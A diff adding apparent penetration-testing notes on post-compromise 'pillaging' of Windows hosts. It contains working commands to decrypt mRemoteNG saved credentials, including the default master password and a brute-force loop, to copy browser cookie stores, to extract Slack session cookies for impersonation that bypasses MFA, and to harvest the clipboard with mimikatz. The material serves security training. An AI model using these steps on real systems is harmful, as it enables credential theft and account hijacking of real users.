@@ -3465,3 +3465,213 @@ dir
 
 ---
 
+
+# Pilaging in Windows 
+
+Pillaging is the phase of a penetration test where, **after gaining a foothold**, you extract as much useful information as possible from a compromised system. This information can help you:
+
+✔ escalate privileges
+✔ move laterally
+✔ access sensitive systems
+✔ achieve objectives (as defined in pre-engagement)
+
+You're essentially **harvesting credentials, tokens, configs, logs, app data, infrastructure info**, etc.
+
+
+## 🗂️ **Common Pillaging Data Sources**
+
+### **1. Installed Applications**
+
+Check:
+
+* `C:\Program Files`
+* `C:\Program Files (x86)`
+* Registry Uninstall keys
+
+Useful because:
+
+* Applications may store **saved passwords**, **API keys**, **certificates**, **connection strings**, etc.
+* Some apps have known weaknesses (example: mRemoteNG).
+
+PowerShell command:
+
+```powershell
+$INSTALLED = Get-ItemProperty HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\* | 
+  Select-Object DisplayName,DisplayVersion,InstallLocation
+$INSTALLED += Get-ItemProperty HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\* |
+  Select-Object DisplayName,DisplayVersion,InstallLocation
+$INSTALLED | ?{ $_.DisplayName -ne $null } | sort DisplayName | ft -AutoSize
+```
+
+
+
+### **2. Installed Services / Infrastructure**
+
+Extract valuable info from:
+
+* Webservers
+* Databases
+* Active Directory
+* File shares
+* Certificate Authority
+* Backups
+* Source Code repos
+* Virtualization platforms
+* Monitoring tools
+* Messaging systems
+
+These frequently contain:
+
+* Config files with credentials
+* Internal URLs / network mapping
+* Flat files with secrets
+* Deployment & automation credentials
+
+
+
+### **3. Sensitive Data Sources**
+
+Includes:
+
+* Keylogging output
+* Screenshots
+* Network captures
+* Previous audit reports
+* Document files (`.docx`, `.xls`, `.txt`, `.pass`, etc.)
+
+
+
+### **4. User Information**
+
+Check:
+
+* Browser credential stores
+* Application history
+* IM clients
+* Role/privilege data
+* SSH keys
+* Saved RDP connections
+
+
+## 💥 **mRemoteNG — High-Value Pillaging Target**
+
+mRemoteNG stores RDP/SSH/VNC credentials in `confCons.xml`.
+
+### **Default master password**
+
+If no custom master password is set:
+
+```
+mR3m
+```
+
+Then the encrypted password can be decrypted using a Python script:
+
+```bash
+python3 mremoteng_decrypt.py -s "<EncryptedPassword>"
+```
+
+### **If a custom master password exists**
+
+You must supply:
+
+```bash
+python3 mremoteng_decrypt.py -s "<EncryptedPassword>" -p "<master_password>"
+```
+
+If unknown, brute-force:
+
+```bash
+for pass in $(cat wordlist.txt); do
+  python3 mremoteng_decrypt.py -s "<Encrypted>" -p $pass
+done
+```
+
+Once decrypted → you now have **RDP credentials**.
+
+
+### 💬 **Stealing IM (Slack, MS Teams) Access via Cookies**
+
+If plaintext credentials are not available, you can steal **browser cookies** and impersonate the user.
+
+## **Firefox Cookie Extraction**
+
+Cookies stored in:
+
+```
+%APPDATA%\Mozilla\Firefox\Profiles\<random>.default-release\cookies.sqlite
+```
+
+Copy:
+
+```powershell
+copy $env:APPDATA\Mozilla\Firefox\Profiles\*.default-release\cookies.sqlite .
+```
+
+Extract Slack cookie named **`d`**:
+
+```bash
+python3 cookieextractor.py --dbpath cookies.sqlite --host slack --cookie d
+```
+
+Then use **Cookie-Editor** browser extension → inject cookie → refresh → logged in as victim.
+
+
+### 🌐 **Chromium Cookie Extraction (Chrome, Edge, Brave)**
+
+Cookies stored in:
+
+```
+%LOCALAPPDATA%\Google\Chrome\User Data\Default\Network\Cookies
+```
+
+Cookies are encrypted with **DPAPI**, so you need to decrypt them **from the victim’s session**.
+
+Use:
+
+```powershell
+Invoke-SharpChromium -Command "cookies slack.com"
+```
+
+If SharpChromium cannot find the cookie file, copy it:
+
+```powershell
+copy "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Network\Cookies" `
+     "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Cookies"
+```
+
+Output gives Slack `d` cookie → impersonation as above.
+
+
+### 🧠 **Why Cookies = Account Access?**
+
+Slack uses the `d` cookie for authentication.
+If you steal it, you bypass:
+
+* Username/password
+* MFA
+* SSO
+
+This is **session hijacking**.
+
+
+### 🧰 **Clipboard Abuse**
+
+Admins using password managers often:
+
+* Copy/paste passwords
+* Never type them
+* Never store them in plaintext
+
+But Windows stores clipboard data in memory → can be harvested using tools like:
+
+* mimikatz (`clipboard` command)
+* powershell scripts
+* custom .NET hooks
+
+Useful when:
+
+* The victim copies sensitive credentials
+* No keystroke logging is possible
+
+---
